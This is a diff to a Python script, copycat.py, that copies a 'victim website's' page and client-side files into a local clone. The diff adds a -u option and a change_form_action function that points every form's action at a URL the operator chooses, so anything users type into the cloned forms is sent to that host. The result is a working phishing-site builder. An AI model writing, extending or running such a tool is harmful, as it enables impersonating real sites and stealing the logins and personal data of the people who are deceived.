@@ -21,11 +21,14 @@ class bcolors:
 
 
 parser = argparse.ArgumentParser(description='Copy client side files from another website',
-                                 epilog='copycat.py "https://github.com" "/jambon69/copycat"')
+                                 epilog='copycat.py "https://github.com" "/jambon69/copycat" -u "test.com"')
+
 parser.add_argument('baseurl', type=str,
                     help='base URL of the victim website')
 parser.add_argument('endpoint', type=str,
                     help='endpoint of the victim page')
+parser.add_argument("-u", "--url", type=str,
+                    help="new url for form actions")
 
 args = parser.parse_args()
 
@@ -40,7 +43,8 @@ try:
 except OSError as e:
     pass
 
-# Get locale files
+
+# Get local files
 def fetchLocalFile(fileName):
     # We create the directory if he doesn't exist
     try:
@@ -55,6 +59,8 @@ def fetchLocalFile(fileName):
     color = bcolors.OKBLUE
     if req.status_code == 404:
         color = bcolors.FAIL
+    elif req.status_code == 403:
+        color = bcolors.WARNING
 
     print "[" + color + str(req.status_code) + bcolors.ENDC + "]" + " -- " + baseURL + '/' + fileName
 
@@ -68,12 +74,16 @@ def fetchLocalFile(fileName):
         newFile.write(req.text.encode('utf-8'))
         newFile.close()
 
+
 # get Full path of local file
 def getFullPath(fullName):
     # toto/../tutu or toto/./tutu
+    if len(fullName) == 0:
+        return fullName
     if fullName[0] != '/':
         return os.path.normpath(os.path.dirname(extURL) + '/' + fullName)
     return fullName
+
 
 # Gets all the files
 def fetchFiles(filesName):
@@ -83,13 +93,28 @@ def fetchFiles(filesName):
             # We erase the first '/'
             fetchLocalFile(getFullPath(filename)[1:])
 
+
 def basicLog(msg, color):
     if len(msg) % 2 != 0:
         msg = "-" + msg
     print color + "-" * ((50-len(msg)) / 2) + msg + "-" * ((50-len(msg)) / 2) + bcolors.ENDC
-    
+
+
+def change_form_action(url, soup):
+    for form in soup.find_all("form"):
+        form['action'] = url
+
 def main():
+    basicLog("Gathering index file", bcolors.OKGREEN)
     req = requests.get(baseURL + extURL)
+    color = bcolors.OKBLUE
+    if req.status_code == 404:
+        color = bcolors.FAIL
+    elif req.status_code == 403:
+        color = bcolors.WARNING
+
+    print "[" + color + str(req.status_code) + bcolors.ENDC + "]" + " -- " + baseURL + extURL
+
     soup = BeautifulSoup(req.text, "lxml")
 
     # Let's gather all scripts
@@ -130,6 +155,11 @@ def main():
         newFile = open(filename[1:], 'w+')
     else:
         newFile = open('index.html', 'w+')
+
+    # Change all form actions endpoint
+    if (args.url):
+        change_form_action(args.url, soup)
+
     newFile.write(str(soup))
     newFile.close()
 
